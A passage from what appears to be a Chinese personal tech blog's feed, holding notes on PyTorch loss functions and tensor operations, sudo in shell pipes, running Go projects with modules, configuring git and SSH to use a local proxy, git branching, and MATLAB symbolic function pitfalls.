Overflow</a></p></li></ol><h2 id="复制创建独立新模型">复制创建独立新模型</h2><pre><code>The PyTorch model 是可变对象，因此直接赋值是浅拷贝，需要使用 `copy.deepcopy()` 或者 `model.state_dict()` 来进行深拷贝。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import copy</span><br><span class="line">modelB = copy.deepcopy(modelA)</span><br></pre></td></tr></table></figure>[Copy PyTorch Model using deepcopy() and state_dict() - Knowledge Transfer](https://androidkt.com/copy-pytorch-model-using-deepcopy-and-state_dict/)</code></pre><h2 id="numpy-和-torch-的-矩阵乘">numpy 和 torch 的 矩阵乘</h2><p>两个矩阵相乘： <code>np.dot(A,B)</code> 或者<code>np.matmul(A, B)</code> 多个矩阵相乘： 每两个使用 <code>dot</code>或者 <code>matmul</code> 或直接使用 <code>@</code> 符号 对应元素相乘：<code>np.multiply</code> 或者 <code>*</code></p><p><code>torch.mul()</code>是对应元素相乘（可广播），<code>torch.mm()</code> 是矩阵相乘 <ahref="https://blog.51cto.com/u_15127604/3856291">torch.mul() 和torch.mm() 区别_mob604756f6df2a 的技术博客_51CTO 博客</a></p><h2 id="jupyter-notebook-缓存问题">jupyter notebook 缓存问题</h2><ol type="1"><li><p>在外部更改了调用的函数的代码，但是它依然使用旧的缓存的代码，解决方法：</p><p>Put in the following two cells at the beggining of your code and itwill automatically reload any new version of your code:</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%load_ext autoreload</span><br><span class="line">%autoreload <span class="number">2</span></span><br></pre></td></tr></table></figure></p><p><ahref="https://stackoverflow.com/questions/29353600/ipython-notebook-caching-issue">python- Ipython notebook caching issue - Stack Overflow</a></p></li></ol><h2 id="交叉熵">交叉熵</h2><p>交叉熵预测结果的概率矩阵，求预测概率最大的值，可以使用的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torch.<span class="built_in">max</span>(<span class="built_in">input</span>, dim, keepdim=<span class="literal">False</span>) 返回 (<span class="built_in">max</span>, max_indices)</span><br><span class="line">torch.argmax(<span class="built_in">input</span>, dim, keepdim=<span class="literal">False</span>) 返回 max_indices</span><br></pre></td></tr></table></figure><p>常见形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outputs = model(images)</span><br><span class="line">_, predicted = torch.<span class="built_in">max</span>(outputs.data, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outputs = model(images)</span><br><span class="line">predicted = outputs.argmax(dim=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="nn.parameter-初始化在-gpu-设备上">nn.Parameter 初始化在 GPU设备上</h2><p><ahref="https://github.com/pytorch/pytorch/issues/20089">[Undesirablebehaviour] Allocating a nn.Parameter on gpu inside a nn.Module makes itnot to be enlisted as network parameter · Issue #20089 ·pytorch/pytorch</a></p><h2 id="softmax-和-sigmoid">softmax 和 sigmoid</h2><table><colgroup><col style="width: 7%" /><col style="width: 49%" /><col style="width: 43%" /></colgroup><thead><tr class="header"><th style="text-align: center;">激活函数</th><th style="text-align: center;">sigmoid</th><th style="text-align: center;">softmax</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">分类</td><tdstyle="text-align: center;">一般用于二值分类，可以但不建议用于多值分类，准确率低</td><td style="text-align: center;">可以用于二值以及多值分类</td></tr><tr class="even"><td style="text-align: center;">使用注意</td><td style="text-align: center;">分类不明确的，概率性的，使用sigmoid</td><td style="text-align: center;">分类互斥，可以明确输出是哪个类别的使用softmax</td></tr><tr class="odd"><td style="text-align: center;">交叉熵</td><td style="text-align: center;">BCE: binary cross-entropy</td><td style="text-align: center;">categorical cross-entropy</td></tr></tbody></table><p><ahref="https://stackoverflow.com/questions/49990816/sigmoid-activation-for-multi-class-classification">machinelearning - Sigmoid activation for multi-class classification? - StackOverflow</a></p><p><ahref="https://datascience.stackexchange.com/questions/39264/how-does-sigmoid-activation-work-in-multi-class-classification-problems">machinelearning - How does Sigmoid activation work in multi-classclassification problems - Data Science Stack Exchange</a></p><h2 id="binary-crossentropy-related">binary crossentropy related</h2><p><code>torch.nn.BCELoss(weight=None, size_average=None, reduce=None, reduction='mean')</code>:weight 是 sigmoid 预测的类别概率，If given, has to be<code>a Tensor of size nbatch</code>: [batch_size,number_class]，（需要梯度，float 类别） <code>'reduction='mean'</code>:the sum of the output will be divided by the number of elements in theoutput.</p><p><code>nn.BCEWithLogitsLoss()</code> 封装了 sigmoid所以直接把模型的输入传进去即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span> = torch.randn(<span class="number">3</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line">target = torch.empty(<span class="number">3</span>).random_(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sigmoid = nn.Sigmoid()</span><br><span class="line">bce_loss = nn.BCELoss()</span><br><span class="line">bce_logits_loss = nn.BCEWithLogitsLoss()</span><br><span class="line"></span><br><span class="line"><span class="comment">#with class probabilities</span></span><br><span class="line">probabilities=sigmoid(<span class="built_in">input</span>)</span><br><span class="line">output = bce_loss(probabilities, target)</span><br><span class="line">output.backward()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output.item()) <span class="comment">#0.4326</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#with logits</span></span><br><span class="line">output = bce_logits_loss(<span class="built_in">input</span>, target)</span><br><span class="line">output.backward()</span><br></pre></td></tr></table></figure><p><ahref="https://zhang-yang.medium.com/how-is-pytorchs-binary-cross-entropy-with-logits-function-related-to-sigmoid-and-d3bd8fb080e7">Howis Pytorch’s binary_cross_entropy_with_logits function related tosigmoid and binary_cross_entropy | by Yang Zhang | Medium</a></p><p><ahref="https://androidkt.com/difference-between-bceloss-and-bcewithlogitsloss-in-pytorch/">Differencebetween BCELoss and BCEWithLogitsLoss in PyTorch - KnowledgeTransfer</a></p><h2 id="soft-targets-vs-hard-target">soft targets vs hard target</h2><p>soft targets 就是 softmax 得出的各类的概率 一般使用 soft target 的loss function</p><p>hard target 包含的信息量（信息熵）很低， soft target包含的信息量大，拥有不同类之间关系的信息（比如同时分类驴和马的时候，尽管某张图片是马，但是soft target 就不会像 hard target 那样只有马的 index 处的值为 1，其余为0，而是在驴的部分也会有概率。）</p><h2 id="mnist-softmax-logistic-regression-参数">MNIST softmax logisticregression 参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Model: &quot;sequential&quot;</span><br><span class="line">mathjax: true</span><br><span class="line">---Layer (type) Output Shape Param #</span><br><span class="line">mathjax: true</span><br><span class="line">---flatten (Flatten) (None, 784) 0</span><br><span class="line">mathjax: true</span><br><span class="line">---dense (Dense) (None, 10) 7850</span><br><span class="line">---</span><br><span class="line">Total params: 7,850</span><br><span class="line">Trainable params: 7,850</span><br><span class="line">Non-trainable params: 0</span><br><span class="line">mathjax: true</span><br><span class="line">---```</span><br><span class="line"></span><br><span class="line">parameters: `784*10 weights + 10 biases at output nodes = 7850`</span><br><span class="line"></span><br><span class="line">每张图像的输出都是一个大小为 10 的向量，该向量的每个元素都指示了该图像属于某个具体标签（0 到 9）的概率。为图像预测得到的标签即为概率最高的标签。</span><br><span class="line"></span><br><span class="line">[Feed-forward and convolutional neural networks](https://uudav.nl/practicals/04_deep_learning/practical_04_answers.html)</span><br><span class="line"></span><br><span class="line">## 多分类/二分类</span><br><span class="line"></span><br><span class="line">对 crossentropy 输出的概率，求最大的值及其索引: `_, preds = torch.max(outputs, 1)`</span><br><span class="line"></span><br><span class="line">At this point, we need to determine the index corresponding to the maximum score in the out tensor. We can do that using the max function in PyTorch, which outputs the maximum value in a tensor as well as the indices where that maximum value occurred.</span><br><span class="line"></span><br><span class="line">## [conv neural network - ValueError: Target size (torch.Size([16])) must be the same as input size (torch.Size([16, 1])) - Stack Overflow](https://stackoverflow.com/questions/57798033/valueerror-target-size-torch-size16-must-be-the-same-as-input-size-torch)</span><br><span class="line"></span><br><span class="line">pytorch 二分类 using BCEWithLogitsLoss， output neuron = 1, `preds.squeeze(dim=-1).float()`</span><br><span class="line"></span><br><span class="line">### 二分类测试</span><br><span class="line"></span><br><span class="line">sigmoid 二分类，测试准确度时，注意预测概率是 [0,1]，所以将其与 0.5 进行比较</span><br><span class="line">`predicted = (model(image) &gt; 0.5).float().squeeze(dim=-1)`</span><br><span class="line"></span><br><span class="line">softmax 二分类，测试准确度时，注意预测概率是 [-inf,inf]，所以需要将其与 0 比较</span><br><span class="line">`predicted = (model(image) &gt; 0).float().squeeze(dim=-1)`</span><br><span class="line"></span><br><span class="line">[Accuracy not changing after second training epoch - PyTorch Forums](https://discuss.pytorch.org/t/accuracy-not-changing-after-second-training-epoch/80405/3)</span><br><span class="line"></span><br><span class="line"># accuracy 先稳定上升，然后一直降低</span><br><span class="line"></span><br><span class="line">学习率过大/batch size 过小，可以对学习率降低 1-2 个量级试试</span><br><span class="line">[训练网络时为什么会出现 loss 逐渐增大的情况？ - 知乎](https://www.zhihu.com/question/60510992)02</span><br><span class="line"></span><br><span class="line">## 准确率先升后降，再升</span><br><span class="line"></span><br><span class="line">采用 warm up + Cosine Anneal：</span><br><span class="line"></span><br><span class="line">[训练神经网络 Loss 先降后升？ - 简书](https://www.jianshu.com/p/c8583867677e)</span><br><span class="line">[base model 第七弹：warm up、consine 衰减 、标签平滑、apex、梯度累加 - 知乎](https://zhuanlan.zhihu.com/p/148487894)</span><br><span class="line"></span><br><span class="line">[使用余弦退火逃离局部最优点——快照集成(Snapshot Ensembles)在 Keras 上的应用 - 知乎](https://zhuanlan.zhihu.com/p/93648558)</span><br><span class="line"></span><br><span class="line">[Pytorch：几行代码轻松实现 Warm up + Cosine Anneal LR\_我是大黄同学呀的博客-CSDN 博客\_pytorch warmup 实现](https://blog.csdn.net/qq_36560894/article/details/114004799)</span><br><span class="line"></span><br><span class="line">[调节学习率 - 知乎](https://zhuanlan.zhihu.com/p/136183319)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 常见问题</title>
      <link href="/blog/2023/01/04/linux/linux_issues/"/>
      <url>/blog/2023/01/04/linux/linux_issues/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li>sudo 在管道中并不传递权限，需要每个命令都用 sudo</li></ol><p>在操作敏感目录时候，使用管道命令，注意如果后面的命令也需要权限，那就也需要写sudo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -L https://github.com/jgm/pandoc/releases/download/3.1.6/pandoc-3.1.6-linux-amd64.tar.gz | sudo tar -xvzf -C $&#123;RUNNER_TOOL_CACHE&#125;/</span><br></pre></td></tr></table></figure><p>错误尝试：(没有在管道之后加 sudo，导致创建失败)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ls</span> ./ || <span class="built_in">mkdir</span> -p /opt/hostedtoolcache</span></span><br><span class="line">.DS_Store.github</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /opt/hostedtoolcache</span></span><br><span class="line">ls: /opt/hostedtoolcache: No such file or directory</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go 项目配置与运行</title>
      <link href="/blog/2022/12/16/programming/go/go_run_project/"/>
      <url>/blog/2022/12/16/programming/go/go_run_project/</url>
      
        <content type="html"><![CDATA[<p>记录一下如何运行一个来自 GitHub 等渠道的现成的 Go 项目.</p><p>情况分两种:</p><ol type="1"><li>有 go.mod 通过 module 方式开发的,</li><li>无 go.mod, 通过 GOPATH 旧版本方式开发的</li></ol><h2 id="module-方式开发">module 方式开发</h2><blockquote><p>Go 1.11 and 1.12 include preliminary support for modules, Go 1.16Modules on by default.</p></blockquote><p>对于有 go.mod 的项目:</p><ol type="1"><li><p><code>git clone xx</code> 克隆项目到本地</p></li><li><p><code>go get</code> 根据 go.mod 下载对应的包</p></li><li><p>是否有 main 函数</p><ol type="1"><li><p>如果有</p><p><code>go run *.go</code> 直接运行,不生成可执行文件<code>go build *.go</code> 编译为可执行二进制文件,然后<code>./main</code> 运行</p></li><li><p>如果没有</p><p>一般库没有 main 函数,每个文件会有对应的 test 函数, 可以使用 vscode 的test 模块进行运行测试,也可以命令行</p><p>直接测试全部文件: <code>go test</code></p><p>指定某个,单独测试: <code>go test xx_test.go</code></p><p>注意:如果该单个测试文件使用了其他包的函数等,会报错</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command-line-arguments</span><br><span class="line">xxx.go. xxvaribale undefined</span><br></pre></td></tr></table></figure></p><p>这种情况需要在 <code>go test xx_test.go</code>之后再加上报错的那些所在的 go 文件</p></li></ol></li></ol><h2 id="gopath-开发">GOPATH 开发</h2><p>GOPATH 开发的,没有 go.mod的基本是比较老的项目了,一般还需要处理库的版本问题.</p><ol type="1"><li><code>git clone xx</code> 克隆项目到本地</li></ol><h3 id="改为-module-形式">改为 module 形式:</h3><ol start="2" type="1"><li><p><code>go mod init mymodule_name</code> 在包文件下,创建 mod</p><p><code>mymodule_name</code> 是你自己写的模块名字,自己定义即可</p><p>go.mod 示例:</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module mymodule_name</span><br><span class="line">go 1.19</span><br></pre></td></tr></table></figure></p><p>然后,需要遍历每个 go 文件,找到引用的外部的包,写到 mod 里面来</p><ol type="1"><li><p><code>go mod tidy</code></p><p>该命令检查代码的包依赖,并将其加入 go.mod, 并移除没有用到的,并创建go.sum 但是如果有旧包找不到,就会报错,不会添加.所以如果有旧包,可以根据其输出先将正常的包及其版本手动添加到 go.mod中,然后可以根据下载的项目的 commit 时间,去找那个旧包大概时间的 commit值</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module mymodule_name</span><br><span class="line"></span><br><span class="line">go 1.19</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">github.com/btcsuite/btcd v0.0.0-20181123190223-3dcf298fed2d</span><br><span class="line">github.com/sirupsen/logrus v1.9.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>对于第一个包,这种需要指定 commit的旧版本包,后面的版本号自己是写不出来的,先直接不写这个包. 通过<code>go get github.com/btcsuite/btcd@commit_value</code> 来将其添加到go mod 中,(go get 也会更新 go.mod, go.sum)</p></li></ol></li><li><p><code>go mod tidy</code> 检查,并创建 `go.sum``</p></li><li><p>最后,参考上面的 <code>是否有 main 函数</code>的部分就好了</p></li></ol><h3 id="不改为-module-形式未测试">不改为 module 形式[未测试]</h3><p>直接 <code>go get</code>默认下载源码导入的依赖的最新版本,如果后续有包报错,再删除包,根绝 commit值 go get</p><h3 id="others">others</h3><p><code>go mod tidy</code>:</p><p>This command goes through the go.mod file to resolvedependencies:</p><ol type="1"><li>delete the packages that are not needed</li><li>download those needed</li><li>update the go.sum</li></ol><h2 id="git-clone-与-go-get">git clone 与 go get</h2><p>git clone 下载仓库项目, go get 根据项目中导入的包下载最新包或者根据go.mod 下载指定版本的包.</p><p>The git clone command will clone a repo into a newly createddirectory, while go get downloads and installs the packages named by theimport paths, along with their dependencies.</p><h2 id="参考">参考</h2><p><ahref="https://blog.csdn.net/love666666shen/article/details/119929929">gotest 进行单元测试时，出现 undefined 方法或者 command-line-arguments[build failed]解决方案_love666666shen 的博客-CSDN 博客_go testundefined</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git 配置代理</title>
      <link href="/blog/2022/11/16/linux/git/git_proxy/"/>
      <url>/blog/2022/11/16/linux/git/git_proxy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>git clone 分 HTTP 形式和 SSH 形式，而这两种形式的都可以走 <code>http</code>  代理和  <code>socks5</code>  代理这两种代理</p></blockquote><h2 id="ssh-形式">SSH 形式</h2><p>ssh 形式：<code>git clone git@github.com/xxx/xxx.git</code>。在<code>~/.ssh/config</code> 文件添加下面内容 （http 代理或者 socks5代理）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># GitHub</span><br><span class="line">Host github.com</span><br><span class="line">   HostName github.com</span><br><span class="line">   IdentityFile ~/.ssh/id_rsa.github #  这个根据自己的私钥名确定</span><br><span class="line">   # 走 HTTP 代理</span><br><span class="line">   # ProxyCommand socat - PROXY:127.0.0.1:%h:%p,proxyport=7890</span><br><span class="line">   # 走 socks5 代理（如 Shadowsocks）</span><br><span class="line">   # ProxyCommand nc -v -x 127.0.0.1:7890 %h %p</span><br></pre></td></tr></table></figure><h2 id="http-形式">HTTP 形式</h2><p>http 形式：<code>git clone https://github.com/xxx/xxx.git</code></p><h3 id="配置-git-全局代理">配置 git 全局代理</h3><p>通过命令配置:</p><ol type="1"><li><p>http 代理</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">git config --global https.proxy &quot;http://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></p></li><li><p>socks5 代理</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;socks5://127.0.0.1:7890&quot;</span><br><span class="line">git config --global https.proxy &quot;socks5://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></p></li><li><p>取消代理</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure></p></li></ol><p>通过 git 配置文件配置:</p><p><code>vim ~/.gitconfig</code> 加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line">    proxy = socks5://127.0.0.1:7890</span><br><span class="line">[https]</span><br><span class="line">    proxy = socks5://127.0.0.1:7890</span><br></pre></td></tr></table></figure><h2 id="配置终端临时代理">配置终端临时代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># proxy list</span><br><span class="line">alias proxy=&#x27;export all_proxy=socks5://127.0.0.1:7890&#x27;</span><br><span class="line">alias unproxy=&#x27;unset all_proxy&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 分支管理</title>
      <link href="/blog/2022/11/16/linux/git/git_branch/"/>
      <url>/blog/2022/11/16/linux/git/git_branch/</url>
      
        <content type="html"><![CDATA[<p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p><p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p><p>但 Git 的分支是与众不同的，无论创建、切换和删除分支，Git 在 1秒钟之内就能完成</p><p>关于分支可以看看这篇文章：<ahref="https://blog.csdn.net/ShuSheng0007/article/details/80791849">实际项目中如何使用Git 做分支管理</a></p><h2 id="创建与合并分支">创建与合并分支</h2><p>每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。截止到目前，只有一条时间线，在Git里，这个分支叫主分支，即<code>master</code>分支。<code>HEAD</code>严格来说不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。</p><p><code>HEAD</code> 指向当前分支, 当前分支是 master 则指向master，是别的则指向别的。</p><p>一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314170748516.png"alt="image-20200314170748516" /><figcaption aria-hidden="true">image-20200314170748516</figcaption></figure><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314160149952.png"alt="image-20200314160149952" /><figcaption aria-hidden="true">image-20200314160149952</figcaption></figure><p>Gi t创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p><p>不过，从现在开始，对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314162733687.png"alt="image-20200314162733687" /><figcaption aria-hidden="true">image-20200314162733687</figcaption></figure><p>所以 Git 合并分支也很快！就改改指针，工作区内容也不变！</p><p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314163042838.png"alt="image-20200314163042838" /><figcaption aria-hidden="true">image-20200314163042838</figcaption></figure><p>Git 鼓励大量使用分支：</p><p>查看分支：<code>git branch</code></p><p>创建分支：<code>git branch</code></p><p>切换分支：<code>git switch</code> 或 <code>git checkout</code></p><p>创建+切换分支：<code>git switch -c</code> 或<code>git checkout -b</code></p><p>合并某分支到当前分支：<code>git merge</code></p><p>删除分支：<code>git branch -d</code></p><h2 id="解决冲突">解决冲突</h2><p>当 Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。其中，<code>git merge &lt;brachname&gt;</code> 的结果或者<code>git status</code> 的结果会搞所我们冲突的文件。</p><p>我们查看该文件，Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，我们修改冲突，然后提交。</p><p>解决冲突就是把 Git合并失败的文件手动编辑为我们希望的内容，再提交。</p><p>用<code>git log --graph</code>命令可以看到分支合并图。</p><h2 id="分支管理策略">分支管理策略</h2><p>通常，合并分支时，如果可能，Git会用<code>Fast forward</code>模式，但这种模式下，删除分支后，会丢掉分支信息。</p><p>如果要强制禁用<code>Fast forward</code>模式，Git 就会在 merge时生成一个新的 commit，这样，从分支历史上就可以看出分支信息。</p><p><code>--no-ff</code>方式的<code>git merge</code></p><p><code>git merge --no-ff -m "merge with no-ff" dev</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314171437733.png"alt="image-20200314171437733" /><figcaption aria-hidden="true">image-20200314171437733</figcaption></figure><h3 id="分支策略">分支策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p><p>那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0 版本；</p><p>你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。</p><p>所以，团队合作的分支看起来就像这样：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314172118805.png"alt="image-20200314172118805" /><figcaption aria-hidden="true">image-20200314172118805</figcaption></figure><h3 id="小结">小结</h3><p>合并分支时，加上<code>--no-ff</code>参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而<code>fast forward</code>合并就看不出来曾经做过合并。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sympy 库 or matlab 符号计算问题记录</title>
      <link href="/blog/2022/11/15/programming/python/sympy_matlab/"/>
      <url>/blog/2022/11/15/programming/python/sympy_matlab/</url>
      
        <content type="html"><![CDATA[<h2 id="sympy-or-matlab">sympy or matlab</h2><p>关于 matlab 中的 symbol 坑：</p><ol type="1"><li><p>符号函数的参数必须是符号，不能是数字,对于耦合的 indexedsymbols/symbol array 的符号函数定义，容易出错的点：</p><p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syms followers(x)</span><br><span class="line">d = sym(<span class="string">&#x27;d&#x27;</span>,[<span class="number">1</span> <span class="number">3</span>],<span class="string">&#x27;positive&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> k=<span class="number">1</span>:<span class="number">2</span></span><br><span class="line">    followers(d(k))=d(k)/(d(<span class="number">1</span>)+d(<span class="number">2</span>)）</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>函数先定义后赋值，这段代码的实际运行时，首先，k=1,定义followers(d(1))=d(1)/(d(1)+d(2)），其中 d(1)为自变量，这样分母的d(1)也是自变量，然后 k=2，</p><p>复制给了以符号为参变量的函数 follower。实际上 followers(d(1)) =followers(d(2)) = followers(d(2))=followers(d) 都是 follower 函数针对 d这一个符号变量的值，这值也就是唯一的，重复赋值，其值只会是最后一个。</p></li><li><p><ahref="https://ww2.mathworks.cn/matlabcentral/answers/350227-indexing-inside-symbolic-product">Indexinginside symbolic product - MATLAB Answers - MATLAB Central</a></p><p>When defining a function, ensure that <strong>the arguments aresymbolic variables</strong> and the body of the function is a SYMexpression. When indexing, <strong>the input must be numeric, logical,or ':'</strong>. Syms can never be used as indices to indexing indexedsymbols.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git 版本控制与修改删除</title>
      <link href="/blog/2022/10/16/linux/git/git_principle/"/>
      <url>/blog/2022/10/16/linux/git/git_principle/</url>
      
